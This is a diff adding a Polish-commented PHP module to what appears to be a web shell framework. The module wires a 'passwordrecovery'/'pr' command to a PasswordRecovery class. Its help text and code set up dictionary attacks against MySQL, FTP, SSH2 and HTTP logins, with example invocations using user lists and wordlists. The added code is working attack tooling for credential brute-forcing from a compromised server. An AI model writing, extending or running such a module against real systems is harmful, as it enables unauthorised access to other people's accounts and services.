@@ -489,3 +489,137 @@ class PasswordRecovery
 	}
 
 }
+
+/**
+ * =================================================================================================
+ */
+
+/**
+ * ModuleDummy - Szkielet modulu
+ */
+class ModulePasswordRecovery implements ShellInterface
+{
+	/**
+	 * Obiekt Shell
+	 *
+	 * @access private
+	 * @var    object
+	 */
+	private $oShell;
+
+	/**
+	 * Konstruktor
+	 *
+	 * @access public
+	 * @param  object $oShell Obiekt Shell
+	 * @return void
+	 */
+	public function __construct( Shell $oShell )
+	{
+		$this -> oShell = $oShell;
+	}
+
+	/**
+	 * Dostepna lista komend
+	 *
+	 * @access public
+	 * @return array
+	 */
+	public function getCommands()
+	{
+		return array
+		(
+			'passwordrecovery',
+			'pr'
+		);
+	}
+
+	/**
+	 * Zwracanie wersji modulu
+	 *
+	 * @access public
+	 * @return string
+	 */
+	public function getVersion()
+	{
+		/**
+		 * Wersja Data Autor
+		 */
+		return '1.0 2011-06-04 - <krzotr@gmail.com>';
+	}
+
+	/**
+	 * Zwracanie pomocy modulu
+	 *
+	 * @access public
+	 * @return string
+	 */
+	public function getHelp()
+	{
+		return <<<DATA
+Odzyskiwanie haseł, atak słownikowy na mysql, ftp, ssh2 oraz http
+
+	Typ:
+		mysql
+		ftp
+		ssh2
+		http
+
+	Użycie:
+		passwordrecovery typ host:port uzytkownik|plik_z_uzytkownikami slownik
+		passwordrecovery typ http://localhost/auth/ uzytkownik|plik_z_uzytkownikami slownik
+
+	Przykład:
+		passwordrecovery http http://localhost/auth/ tester /tmp/dic
+		passwordrecovery mysql localhost:3306 tester /tmp/dic
+DATA;
+	}
+
+	/**
+	 * Wywolanie modulu
+	 *
+	 * @access public
+	 * @return string
+	 */
+	public function get()
+	{
+		/**
+		 * Czy modul jest zaladowany
+		 */
+		if( ! class_exists( 'PasswordRecovery' ) )
+		{
+			return 'passwordrecovery, pr - !!! moduł nie został załadowany';
+		}
+
+		/**
+		 * Help
+		 */
+		if( $this -> oShell -> iArgc !== 4 )
+		{
+			return $this -> getVersion();
+		}
+
+		try
+		{
+			ob_start();
+
+			header( 'Content-Type: text/plain; charset=utf-8', TRUE );
+
+			$oPasswordRecovery = new PasswordRecovery();
+			$oPasswordRecovery -> setHost( $this -> oShell -> aArgv[1] )
+					   -> setType( $this -> oShell -> aArgv[0] )
+					   -> setUsers( $this -> oShell -> aArgv[2] )
+					   -> setPasswords( $this -> oShell -> aArgv[3] )
+					   -> get();
+			ob_end_flush();
+			exit ;
+
+		}
+		catch( PasswordRecoveryException $oException )
+		{
+			header( 'Content-Type: text/html; charset=utf-8', TRUE );
+			return $oException -> getMessage();
+		}
+	}
+
+}
